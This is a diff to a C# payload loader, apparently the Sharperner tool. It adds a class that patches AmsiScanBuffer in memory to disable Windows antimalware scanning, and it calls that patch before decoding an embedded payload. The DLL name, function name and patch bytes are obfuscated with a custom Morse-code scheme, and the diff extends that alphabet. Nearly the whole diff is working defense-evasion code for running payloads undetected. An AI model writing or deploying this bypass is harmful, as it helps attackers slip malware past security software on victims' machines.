@@ -1,4 +1,5 @@
 using System;
+using System.Runtime.InteropServices;
 using System.IO;
 using System.IO.Compression;
 using Sharperner.Execution;
@@ -13,6 +14,51 @@ using System.Text;
 
 namespace DInvoke
 {
+    class AmsiPatch
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+
+        public static void Execute()
+        {
+            try
+            {
+                Program.InitializeDictionary();
+
+                //Implementation of _RastaMouse's AmsiScanBuffer patch + opcode from @rodzianko
+
+                var b64patchBytes = "^-- -.-. ^.- ^..-. . ^.- ^. ^--.. ..-. .-- ^-..- ..-. / ..- ----- ^.- .-- .-- ...^- ...^- ";
+                byte[] patch = Convert.FromBase64String(Program.Receive(b64patchBytes));
+
+                var rahsia = ".- -- ... .. .^. -.. .-.. .-.. ";
+                var rahsia2 = "^.- -- ... .. ^... -.-. .- -. ^-... ..- ..-. ..-. . .-. ";
+
+                IntPtr loadLibrary = LoadLibrary(Program.Receive(rahsia));
+                IntPtr addressLocation = GetProcAddress(loadLibrary, Program.Receive(rahsia2));
+
+                VirtualProtect(addressLocation, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
+
+                Marshal.Copy(patch, 0, addressLocation, patch.Length);
+
+                VirtualProtect(addressLocation, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+
+                Console.WriteLine("[*] Patched AmsiScanBuffer!");
+            }
+            catch(Exception e)
+            {
+                Console.WriteLine("[!]AmsiPatch failed :(!");
+            }
+        }
+
+    }
+
     public class Program
     {
         private static Dictionary<char, string> _morseAlphabetDictionary;
@@ -21,7 +67,7 @@ namespace DInvoke
         {
             _morseAlphabetDictionary = new Dictionary<char, string>()
                                    {
-{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
+{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},{ '.', ".^." },
                                    };
         }
 
@@ -95,6 +141,9 @@ namespace DInvoke
 
                Console.WriteLine(b64String);
                */
+
+            AmsiPatch.Execute();
+
             string morsedb64string = "REPLACE MORSECODE HERE";
 
             InitializeDictionary();
